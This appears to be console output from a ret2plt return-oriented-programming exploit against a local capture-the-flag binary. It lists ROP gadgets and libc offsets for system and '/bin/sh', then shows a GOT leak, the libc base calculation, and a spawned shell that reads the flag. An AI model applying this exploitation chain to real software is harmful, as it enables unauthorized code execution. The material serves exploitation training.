```
python3 check-elf-rop-primitives.py BIN=./chal.bin
[*] Discovering gadgets for binary
[*] ------------------------------
[*] Loaded 14 cached gadgets for './chal.bin'
[*] Discovering Gadgets
[*] 4195587: Gadget(0x400503, ['add esp, 8', 'ret'], ['0x8'], 0x10)
[*] 4195586: Gadget(0x400502, ['add rsp, 8', 'ret'], ['0x8'], 0x10)
[*] 4196004: Gadget(0x4006a4, ['leave', 'ret'], ['rbp', 'rsp'], 0x2540be407)
[*] 4196124: Gadget(0x40071c, ['pop r12', 'pop r13', 'pop r14', 'pop r15', 'ret'], ['r12', 'r13', 'r14', 'r15'], 0x28)
[*] 4196126: Gadget(0x40071e, ['pop r13', 'pop r14', 'pop r15', 'ret'], ['r13', 'r14', 'r15'], 0x20)
[*] 4196128: Gadget(0x400720, ['pop r14', 'pop r15', 'ret'], ['r14', 'r15'], 0x18)
[*] 4196130: Gadget(0x400722, ['pop r15', 'ret'], ['r15'], 0x10)
[*] 4196123: Gadget(0x40071b, ['pop rbp', 'pop r12', 'pop r13', 'pop r14', 'pop r15', 'ret'], ['rbp', 'r12', 'r13', 'r14', 'r15'], 0x30)
[*] 4196127: Gadget(0x40071f, ['pop rbp', 'pop r14', 'pop r15', 'ret'], ['rbp', 'r14', 'r15'], 0x20)
[*] 4195768: Gadget(0x4005b8, ['pop rbp', 'ret'], ['rbp'], 0x10)
[*] 4196131: Gadget(0x400723, ['pop rdi', 'ret'], ['rdi'], 0x10)
[*] 4196129: Gadget(0x400721, ['pop rsi', 'pop r15', 'ret'], ['rsi', 'r15'], 0x18)
[*] 4196125: Gadget(0x40071d, ['pop rsp', 'pop r13', 'pop r14', 'pop r15', 'ret'], ['rsp', 'r13', 'r14', 'r15'], 0x28)
[*] 4195590: Gadget(0x400506, ['ret'], [], 0x8)
[*] 
    Discovering Available Symbols
[*] -----------------------------
[*] puts
[*] setbuf
[*] gets
```

```
python3 check-libc-rop-primitives.py BIN=/lib/x86_64-linux-gnu/libc.so.6
[*] Discovering gadgets for binary
[*] Loaded 205 cached gadgets for '/lib/x86_64-linux-gnu/libc.so.6'
[*] Loading libc
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Pop RDI is at 0x27c65
[*] System is at 0x4c920
[*] /bin/sh is at 0x19604f
```

```
python3 pwn-ret2plt.py BIN=./chal.bin
[*] Loaded 14 cached gadgets for './chal.bin'
[*] '/usr/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process '/demos/ret2plt-demo/chal.bin': pid 4678
[*] POP RDI is at 0x400723
[*] GOT[gets] is at 0x601028
[*] PLT[puts] is at 0x400520
[*] main is at 0x4196006
[*] Sending Ret2PLT Chain and Waiting for GOT[gets] Leak
[*] Paused (press any to continue)
[*] GOT[Gets] is at 0x7fad81df3050
[*] Calculating Libc Base: GOT[gets](0x7fad81df3050) - Libc.sym[Gets] (0x75050) = Libc Base (0x7fad81d7e000)
[*] Libc base is at 0x7fad81d7e000
[*] System is at 0x7fad81dca920
[*] /bin/sh is at 0x7fad81f1404f
[*] Paused (press any to continue)
[*] Sending Chain Borrowing /bin/sh (0x7fad81f1404f) and system (0x7fad81dca920) from Libc
[*] Switching to interactive mode
$ cat flag.txt
flag{i_sure_wished_this_worked_remotely_too}
```